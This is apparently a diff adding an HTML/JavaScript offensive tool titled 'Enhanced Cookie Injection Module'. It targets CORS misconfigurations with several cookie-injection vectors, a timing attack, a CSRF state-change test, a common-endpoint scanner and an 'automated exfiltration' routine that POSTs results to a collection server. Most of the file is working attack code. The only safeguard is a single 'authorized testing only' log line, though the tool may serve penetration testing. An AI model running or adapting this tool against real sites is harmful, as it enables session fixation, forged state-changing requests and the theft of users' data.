@@ -1,0 +1,750 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>Enhanced Cookie Injection Module</title>
+<style>
+  body { font-family: system-ui, sans-serif; margin: 1rem; background: #0a0e1a; color: #d6ffe6; }
+  .section { background: #131823; padding: 16px; margin: 12px 0; border-radius: 8px; border: 1px solid #1e2837; }
+  .section h3 { margin-top: 0; color: #6ee7b7; }
+  input, button, select, textarea { 
+    font-size: 14px; 
+    margin: 4px; 
+    padding: 8px 12px;
+    background: #1e2837;
+    color: #d6ffe6;
+    border: 1px solid #2d3748;
+    border-radius: 4px;
+  }
+  button { cursor: pointer; background: #1e3a5f; transition: all 0.2s; }
+  button:hover:not(:disabled) { background: #2563eb; }
+  button:disabled { opacity: 0.5; cursor: not-allowed; }
+  button.danger { background: #7f1d1d; }
+  button.danger:hover:not(:disabled) { background: #dc2626; }
+  #out { 
+    white-space: pre-wrap; 
+    background: #0b1020; 
+    color: #d6ffe6; 
+    padding: 12px; 
+    border-radius: 6px; 
+    min-height: 300px; 
+    margin-top: 10px;
+    font-family: 'Courier New', monospace;
+    font-size: 13px;
+    max-height: 600px;
+    overflow-y: auto;
+  }
+  .row { margin: 8px 0; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+  label { color: #a5b4fc; }
+  .success { color: #6ee7b7; }
+  .error { color: #fca5a5; }
+  .warning { color: #fcd34d; }
+  .info { color: #93c5fd; }
+  .status-badge { 
+    display: inline-block;
+    padding: 4px 8px;
+    border-radius: 4px;
+    font-size: 12px;
+    font-weight: bold;
+  }
+  .status-success { background: #065f46; color: #6ee7b7; }
+  .status-error { background: #7f1d1d; color: #fca5a5; }
+  .status-warning { background: #78350f; color: #fcd34d; }
+</style>
+
+<h1>🔒 Enhanced Cookie Injection Module</h1>
+
+<div class="section">
+  <h3>Target Configuration</h3>
+  <div class="row">
+    <label>Target Origin:</label>
+    <input id="target" value="https://app.example.com" size="50" placeholder="https://target.com" />
+  </div>
+  <div class="row">
+    <label>Target Path:</label>
+    <input id="path" value="/api/protected" size="40" placeholder="/api/endpoint" />
+  </div>
+  <div class="row">
+    <label>Cookie Name to Inject:</label>
+    <input id="cookieName" value="session" size="30" placeholder="session, authToken, etc." />
+  </div>
+  <div class="row">
+    <label>Cookie Value:</label>
+    <input id="cookieValue" value="INJECTED_VALUE" size="40" placeholder="Value or payload" />
+  </div>
+</div>
+
+<div class="section">
+  <h3>Attack Methods</h3>
+  <div class="row">
+    <button id="basicInjection">Basic Cookie Injection Test</button>
+    <button id="advancedInjection">Advanced Multi-Vector Injection</button>
+    <button id="timingAttack">Timing Attack Analysis</button>
+  </div>
+  <div class="row">
+    <button id="csrfTest">CSRF State-Change Test</button>
+    <button id="batchTest">Batch Endpoint Scanner</button>
+    <button id="automatedExfil">Automated Exfiltration (Server)</button>
+  </div>
+</div>
+
+<div class="section">
+  <h3>Advanced Options</h3>
+  <div class="row">
+    <label>HTTP Method:</label>
+    <select id="method">
+      <option>GET</option>
+      <option selected>POST</option>
+      <option>PUT</option>
+      <option>PATCH</option>
+      <option>DELETE</option>
+    </select>
+  </div>
+  <div class="row">
+    <label>Request Body (JSON):</label>
+    <textarea id="body" rows="2" cols="60">{"action": "test", "timestamp": "${Date.now()}"}</textarea>
+  </div>
+  <div class="row">
+    <label><input type="checkbox" id="autoExfil" /> Auto-exfiltrate results to server</label>
+  </div>
+  <div class="row">
+    <label><input type="checkbox" id="cleanupCookies" checked /> Cleanup injected cookies after test</label>
+  </div>
+  <div class="row">
+    <label>Server Endpoint:</label>
+    <input id="serverEndpoint" value="/collect-evidence" size="40" placeholder="/api/collect" />
+  </div>
+</div>
+
+<div class="section">
+  <h3>Output & Evidence</h3>
+  <div class="row">
+    <button id="clearLog">Clear Log</button>
+    <button id="downloadEvidence">Download Evidence</button>
+    <button id="copyResults">Copy to Clipboard</button>
+    <span id="status" style="margin-left: 12px;"></span>
+  </div>
+  <div id="out"></div>
+</div>
+
+<input type="text" id="cookieName" placeholder="Cookie Name" style="width:150px; margin-right:10px;">
+<input type="text" id="cookieValue" placeholder="Cookie Value" style="width:250px; margin-right:10px;">
+<button id="setCookieBtn">Set Cookie</button>
+
+
+
+<script>
+
+document.getElementById('setCookieBtn').addEventListener('click', () => {
+  const name = document.getElementById('cookieName').value.trim();
+  const value = document.getElementById('cookieValue').value.trim();
+  
+  if (!name || !value) {
+    alert('Please enter both cookie name and value.');
+    return;
+  }
+    // Set cookie with optional parameters (path, expiry)
+  document.cookie = `${name}=${value}; path=/;`;
+  alert(`Cookie "${name}" set to "${value}"`);
+});
+
+
+// ============================================================================
+// LOGGING SYSTEM
+// ============================================================================
+const out = document.getElementById('out');
+const status = document.getElementById('status');
+let logBuffer = [];
+let testResults = [];
+
+function log(msg, level = 'info') {
+  const timestamp = new Date().toISOString();
+  const prefix = {
+    'success': '✓',
+    'error': '✗',
+    'warning': '⚠',
+    'info': '→'
+  }[level] || '•';
+  
+  const colorClass = {
+    'success': 'success',
+    'error': 'error',
+    'warning': 'warning',
+    'info': 'info'
+  }[level] || '';
+  
+  const line = `[${timestamp}] ${prefix} ${msg}`;
+  logBuffer.push(line);
+  
+  const span = document.createElement('span');
+  span.className = colorClass;
+  span.textContent = line + '\n';
+  out.appendChild(span);
+  out.scrollTop = out.scrollHeight;
+}
+
+function hr() {
+  const line = '─'.repeat(80);
+  logBuffer.push(line);
+  out.textContent += line + '\n';
+}
+
+function clear() {
+  logBuffer = [];
+  testResults = [];
+  out.textContent = '';
+}
+
+function setStatus(msg, type = 'info') {
+  const badge = document.createElement('span');
+  badge.className = `status-badge status-${type}`;
+  badge.textContent = msg;
+  status.innerHTML = '';
+  status.appendChild(badge);
+  
+  setTimeout(() => {
+    status.innerHTML = '';
+  }, 5000);
+}
+
+// ============================================================================
+// COOKIE INJECTION ENGINE
+// ============================================================================
+
+async function cookieInjectionAttack(config) {
+  const {
+    target,
+    path = '/',
+    cookieName,
+    cookieValue,
+    method = 'POST',
+    body = null,
+    timeout = 5000,
+    cleanup = true,
+    vectors = ['standard', 'quoted', 'version']
+  } = config;
+
+  const url = new URL(path, target);
+  const domain = url.hostname;
+  const targetPath = url.pathname;
+  
+  log(`Starting cookie injection attack on ${url.href}`, 'info');
+  log(`Target: ${domain}, Cookie: ${cookieName}=${cookieValue.substring(0, 20)}...`);
+  
+  const result = {
+    target: url.href,
+    timestamp: new Date().toISOString(),
+    cookieName,
+    success: false,
+    vectors: [],
+    response: null,
+    timing: {},
+    error: null
+  };
+
+  return new Promise((resolve) => {
+    const iframe = document.createElement('iframe');
+    iframe.src = url.href;
+    iframe.style.display = 'none';
+    iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts');
+    
+    const timeoutId = setTimeout(() => {
+      cleanup && cleanupIframe();
+      result.error = 'Timeout';
+      log(`Attack timed out after ${timeout}ms`, 'warning');
+      resolve(result);
+    }, timeout);
+
+    const cleanupIframe = () => {
+      clearTimeout(timeoutId);
+      if (iframe.parentNode) document.body.removeChild(iframe);
+      
+      if (cleanup) {
+        const cookiesToClean = [
+          `${cookieName}=; domain=${domain}; path=${targetPath}; expires=Thu, 01 Jan 1970 00:00:00 GMT`,
+          `dummy=; domain=${domain}; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT`
+        ];
+        cookiesToClean.forEach(c => {
+          try { document.cookie = c; } catch (e) {}
+        });
+      }
+    };
+
+    iframe.onload = async () => {
+      const startTime = performance.now();
+      
+      try {
+        // Inject cookies using multiple vectors
+        const injectionVectors = {
+          standard: `${cookieName}=${cookieValue}; domain=${domain}; path=${targetPath}`,
+          quoted: `${cookieName}="${cookieValue}; domain=${domain}; path=${targetPath}`,
+          version: `$Version=1; ${cookieName}=${cookieValue}; domain=${domain}; path=${targetPath}`,
+          dummy: `dummy=qaz"; domain=${domain}; path=/`
+        };
+
+        vectors.forEach(vectorName => {
+          if (injectionVectors[vectorName]) {
+            try {
+              document.cookie = injectionVectors[vectorName];
+              result.vectors.push({ name: vectorName, cookie: injectionVectors[vectorName], success: true });
+              log(`Injected cookie using ${vectorName} vector`, 'success');
+            } catch (e) {
+              result.vectors.push({ name: vectorName, success: false, error: e.message });
+              log(`Failed to inject using ${vectorName}: ${e.message}`, 'error');
+            }
+          }
+        });
+
+        // Wait for cookies to propagate
+        await new Promise(r => setTimeout(r, 100));
+        
+        result.timing.injection = performance.now() - startTime;
+
+        // Attempt to make request with injected cookies
+        const fetchStart = performance.now();
+        const fetchOptions = {
+          method,
+          credentials: 'include',
+          mode: 'cors',
+          headers: { 'Content-Type': 'application/json' }
+        };
+
+        if (body && method !== 'GET') {
+          fetchOptions.body = typeof body === 'string' ? body : JSON.stringify(body);
+        }
+
+        const response = await fetch(url.href, fetchOptions);
+        result.timing.request = performance.now() - fetchStart;
+        result.timing.total = performance.now() - startTime;
+
+        // Collect response data
+        result.response = {
+          status: response.status,
+          statusText: response.statusText,
+          headers: {},
+          corsHeaders: {}
+        };
+
+        // Extract headers
+        response.headers.forEach((value, key) => {
+          result.response.headers[key] = value;
+          if (key.toLowerCase().includes('access-control')) {
+            result.response.corsHeaders[key] = value;
+          }
+        });
+
+        // Try to read response body
+        try {
+          const contentType = response.headers.get('content-type') || '';
+          if (contentType.includes('application/json')) {
+            result.response.body = await response.json();
+          } else {
+            result.response.body = await response.text();
+          }
+          result.response.bodyPreview = JSON.stringify(result.response.body).substring(0, 500);
+        } catch (e) {
+          result.response.bodyError = e.message;
+        }
+
+        result.success = true;
+        log(`Request completed: ${response.status} ${response.statusText}`, 'success');
+        log(`Timing - Injection: ${result.timing.injection.toFixed(2)}ms, Request: ${result.timing.request.toFixed(2)}ms`, 'info');
+        
+        // Log CORS headers
+        if (Object.keys(result.response.corsHeaders).length > 0) {
+          log('CORS Headers detected:', 'warning');
+          Object.entries(result.response.corsHeaders).forEach(([k, v]) => {
+            log(`  ${k}: ${v}`, 'warning');
+          });
+        }
+
+      } catch (error) {
+        result.error = error.message;
+        result.corsBlocked = error.message.includes('CORS') || error.name === 'TypeError';
+        
+        if (result.corsBlocked) {
+          log(`CORS blocked the response, but cookies were sent`, 'warning');
+          log(`This proves the misconfiguration: ACAO + ACAC allows credentialed requests`, 'warning');
+        } else {
+          log(`Request failed: ${error.message}`, 'error');
+        }
+      } finally {
+        cleanupIframe();
+        testResults.push(result);
+        resolve(result);
+      }
+    };
+
+    iframe.onerror = () => {
+      cleanupIframe();
+      result.error = 'Failed to load iframe';
+      log('Iframe load failed', 'error');
+      resolve(result);
+    };
+
+    document.body.appendChild(iframe);
+  });
+}
+
+// ============================================================================
+// TIMING ATTACK ANALYZER
+// ============================================================================
+
+async function timingAttackAnalysis(config) {
+  log('Starting timing attack analysis...', 'info');
+  log('This tests if authenticated vs unauthenticated requests have different response times', 'info');
+  hr();
+
+  const runs = 5;
+  const results = { authenticated: [], unauthenticated: [] };
+
+  // Authenticated requests (with cookie injection)
+  for (let i = 0; i < runs; i++) {
+    log(`Authenticated run ${i + 1}/${runs}...`);
+    const result = await cookieInjectionAttack({ ...config, cleanup: i === runs - 1 });
+    if (result.timing.request) {
+      results.authenticated.push(result.timing.request);
+    }
+    await new Promise(r => setTimeout(r, 500));
+  }
+
+  hr();
+
+  // Unauthenticated requests (no cookies)
+  for (let i = 0; i < runs; i++) {
+    log(`Unauthenticated run ${i + 1}/${runs}...`);
+    const start = performance.now();
+    try {
+      await fetch(config.target + config.path, {
+        method: config.method,
+        credentials: 'omit',
+        mode: 'cors'
+      });
+    } catch (e) {}
+    results.unauthenticated.push(performance.now() - start);
+    await new Promise(r => setTimeout(r, 500));
+  }
+
+  // Calculate statistics
+  const avg = arr => arr.reduce((a, b) => a + b, 0) / arr.length;
+  const stdDev = arr => {
+    const mean = avg(arr);
+    return Math.sqrt(arr.reduce((sq, n) => sq + Math.pow(n - mean, 2), 0) / arr.length);
+  };
+
+  const authAvg = avg(results.authenticated);
+  const unauthAvg = avg(results.unauthenticated);
+  const authStdDev = stdDev(results.authenticated);
+  const unauthStdDev = stdDev(results.unauthenticated);
+  const difference = Math.abs(authAvg - unauthAvg);
+  const significant = difference > (authStdDev + unauthStdDev);
+
+  hr();
+  log('TIMING ANALYSIS RESULTS:', 'success');
+  log(`Authenticated avg: ${authAvg.toFixed(2)}ms (±${authStdDev.toFixed(2)}ms)`);
+  log(`Unauthenticated avg: ${unauthAvg.toFixed(2)}ms (±${unauthStdDev.toFixed(2)}ms)`);
+  log(`Difference: ${difference.toFixed(2)}ms`);
+  log(`Statistically significant: ${significant ? 'YES' : 'NO'}`, significant ? 'warning' : 'info');
+  
+  if (significant) {
+    log('⚠ Timing difference suggests server processes authenticated requests differently', 'warning');
+    log('This could be exploited to infer authentication state or enumerate valid sessions', 'warning');
+  }
+  
+  hr();
+  return { results, authAvg, unauthAvg, difference, significant };
+}
+
+// ============================================================================
+// BATCH ENDPOINT SCANNER
+// ============================================================================
+
+async function batchEndpointScan(baseTarget, cookieName, cookieValue) {
+  const commonEndpoints = [
+    '/api/user',
+    '/api/profile',
+    '/api/account',
+    '/api/settings',
+    '/api/projects',
+    '/api/data',
+    '/api/admin',
+    '/graphql',
+    '/.well-known/security.txt',
+    '/v1/me',
+    '/v1/users/me'
+  ];
+
+  log(`Starting batch scan of ${commonEndpoints.length} endpoints...`, 'info');
+  hr();
+
+  const results = [];
+  for (const endpoint of commonEndpoints) {
+    log(`Testing: ${endpoint}`);
+    const result = await cookieInjectionAttack({
+      target: baseTarget,
+      path: endpoint,
+      cookieName,
+      cookieValue,
+      method: 'GET',
+      cleanup: true,
+      timeout: 3000
+    });
+    
+    results.push({
+      endpoint,
+      vulnerable: result.success && result.response && result.response.status === 200,
+      status: result.response?.status || 'error',
+      corsHeaders: result.response?.corsHeaders || {}
+    });
+    
+    await new Promise(r => setTimeout(r, 300));
+  }
+
+  hr();
+  log('BATCH SCAN RESULTS:', 'success');
+  const vulnerable = results.filter(r => r.vulnerable);
+  log(`Vulnerable endpoints: ${vulnerable.length}/${results.length}`);
+  
+  vulnerable.forEach(v => {
+    log(`  ✓ ${v.endpoint} (${v.status})`, 'warning');
+  });
+  
+  hr();
+  return results;
+}
+
+// ============================================================================
+// AUTO EXFILTRATION TO SERVER
+// ============================================================================
+
+async function exfiltrateToServer(data, endpoint) {
+  log(`Exfiltrating evidence to server: ${endpoint}`, 'info');
+  
+  try {
+    const response = await fetch(endpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      credentials: 'include',
+      body: JSON.stringify({
+        type: 'cookie_injection_evidence',
+        timestamp: new Date().toISOString(),
+        data: data,
+        metadata: {
+          userAgent: navigator.userAgent,
+          origin: window.location.origin,
+          testCount: testResults.length
+        }
+      })
+    });
+
+    if (response.ok) {
+      const result = await response.json();
+      log(`✓ Evidence successfully sent to server`, 'success');
+      if (result.evidence_id) {
+        log(`  Evidence ID: ${result.evidence_id}`, 'success');
+      }
+      return true;
+    } else {
+      log(`✗ Server returned ${response.status}`, 'error');
+      return false;
+    }
+  } catch (error) {
+    log(`✗ Exfiltration failed: ${error.message}`, 'error');
+    return false;
+  }
+}
+
+// ============================================================================
+// EVENT HANDLERS
+// ============================================================================
+
+document.getElementById('basicInjection').onclick = async () => {
+  clear();
+  const config = {
+    target: document.getElementById('target').value.trim(),
+    path: document.getElementById('path').value.trim(),
+    cookieName: document.getElementById('cookieName').value.trim(),
+    cookieValue: document.getElementById('cookieValue').value.trim(),
+    method: document.getElementById('method').value,
+    body: document.getElementById('body').value,
+    cleanup: document.getElementById('cleanupCookies').checked
+  };
+
+  if (!config.target || !config.cookieName) {
+    log('Error: Target and cookie name required', 'error');
+    return;
+  }
+
+  setStatus('Running...', 'info');
+  const result = await cookieInjectionAttack(config);
+  setStatus(result.success ? 'Success' : 'Failed', result.success ? 'success' : 'error');
+
+  if (document.getElementById('autoExfil').checked) {
+    await exfiltrateToServer(result, document.getElementById('serverEndpoint').value);
+  }
+};
+
+document.getElementById('advancedInjection').onclick = async () => {
+  clear();
+  log('Running advanced multi-vector injection...', 'info');
+  
+  const config = {
+    target: document.getElementById('target').value.trim(),
+    path: document.getElementById('path').value.trim(),
+    cookieName: document.getElementById('cookieName').value.trim(),
+    cookieValue: document.getElementById('cookieValue').value.trim(),
+    method: document.getElementById('method').value,
+    body: document.getElementById('body').value,
+    cleanup: document.getElementById('cleanupCookies').checked,
+    vectors: ['standard', 'quoted', 'version', 'dummy']
+  };
+
+  setStatus('Running...', 'info');
+  const result = await cookieInjectionAttack(config);
+  setStatus(result.success ? 'Complete' : 'Failed', result.success ? 'success' : 'error');
+
+  if (document.getElementById('autoExfil').checked) {
+    await exfiltrateToServer(result, document.getElementById('serverEndpoint').value);
+  }
+};
+
+document.getElementById('timingAttack').onclick = async () => {
+  clear();
+  const config = {
+    target: document.getElementById('target').value.trim(),
+    path: document.getElementById('path').value.trim(),
+    cookieName: document.getElementById('cookieName').value.trim(),
+    cookieValue: document.getElementById('cookieValue').value.trim(),
+    method: 'GET'
+  };
+
+  setStatus('Analyzing...', 'info');
+  const result = await timingAttackAnalysis(config);
+  setStatus('Complete', 'success');
+
+  if (document.getElementById('autoExfil').checked) {
+    await exfiltrateToServer(result, document.getElementById('serverEndpoint').value);
+  }
+};
+
+document.getElementById('batchTest').onclick = async () => {
+  clear();
+  const target = document.getElementById('target').value.trim();
+  const cookieName = document.getElementById('cookieName').value.trim();
+  const cookieValue = document.getElementById('cookieValue').value.trim();
+
+  setStatus('Scanning...', 'info');
+  const results = await batchEndpointScan(target, cookieName, cookieValue);
+  setStatus(`Found ${results.filter(r => r.vulnerable).length} vulnerable`, 'warning');
+
+  if (document.getElementById('autoExfil').checked) {
+    await exfiltrateToServer(results, document.getElementById('serverEndpoint').value);
+  }
+};
+
+document.getElementById('csrfTest').onclick = async () => {
+  clear();
+  log('Testing CSRF capability with injected cookies...', 'warning');
+  log('⚠ This will attempt state-changing operations', 'warning');
+  hr();
+
+  const config = {
+    target: document.getElementById('target').value.trim(),
+    path: document.getElementById('path').value.trim(),
+    cookieName: document.getElementById('cookieName').value.trim(),
+    cookieValue: document.getElementById('cookieValue').value.trim(),
+    method: document.getElementById('method').value,
+    body: JSON.stringify({
+      action: 'csrf_test',
+      timestamp: Date.now(),
+      test_id: Math.random().toString(36).substr(2, 9)
+    }),
+    cleanup: true
+  };
+
+  setStatus('Testing CSRF...', 'warning');
+  const result = await cookieInjectionAttack(config);
+  
+  if (result.success && result.response?.status < 300) {
+    log('⚠ CRITICAL: State-changing request succeeded with injected cookies!', 'error');
+    log('This demonstrates CSRF vulnerability via CORS misconfiguration', 'error');
+    setStatus('CSRF Possible!', 'error');
+  } else {
+    log('State-change request was blocked or failed', 'info');
+    setStatus('CSRF Blocked', 'success');
+  }
+
+  if (document.getElementById('autoExfil').checked) {
+    await exfiltrateToServer(result, document.getElementById('serverEndpoint').value);
+  }
+};
+
+document.getElementById('automatedExfil').onclick = async () => {
+  clear();
+  log('Starting automated exfiltration workflow...', 'warning');
+  hr();
+
+  const config = {
+    target: document.getElementById('target').value.trim(),
+    path: document.getElementById('path').value.trim(),
+    cookieName: document.getElementById('cookieName').value.trim(),
+    cookieValue: document.getElementById('cookieValue').value.trim(),
+    method: 'GET',
+    cleanup: true
+  };
+
+  setStatus('Exfiltrating...', 'warning');
+  
+  // Run attack
+  const result = await cookieInjectionAttack(config);
+  
+  // Always send to server
+  const exfilSuccess = await exfiltrateToServer(result, document.getElementById('serverEndpoint').value);
+  
+  if (exfilSuccess) {
+    log('✓ Full attack chain completed successfully', 'success');
+    setStatus('Exfiltrated', 'success');
+  } else {
+    log('✗ Exfiltration failed', 'error');
+    setStatus('Failed', 'error');
+  }
+};
+
+document.getElementById('clearLog').onclick = clear;
+
+document.getElementById('downloadEvidence').onclick = () => {
+  const evidence = {
+    timestamp: new Date().toISOString(),
+    logs: logBuffer,
+    results: testResults,
+    metadata: {
+      userAgent: navigator.userAgent,
+      origin: window.location.origin
+    }
+  };
+
+  const blob = new Blob([JSON.stringify(evidence, null, 2)], { type: 'application/json' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `cookie-injection-evidence-${Date.now()}.json`;
+  a.click();
+  URL.revokeObjectURL(a.href);
+  
+  setStatus('Downloaded', 'success');
+};
+
+document.getElementById('copyResults').onclick = () => {
+  const text = logBuffer.join('\n');
+  navigator.clipboard.writeText(text).then(() => {
+    setStatus('Copied to clipboard', 'success');
+  }).catch(() => {
+    setStatus('Copy failed', 'error');
+  });
+};
+
+// ============================================================================
+// INITIALIZATION
+// ============================================================================
+log('🔒 Enhanced Cookie Injection Module loaded', 'success');
+log('Ready to test CORS misconfigurations and cookie injection vulnerabilities', 'info');
+log('⚠ Only use in authorized testing environments', 'warning');
+hr();
+</script>
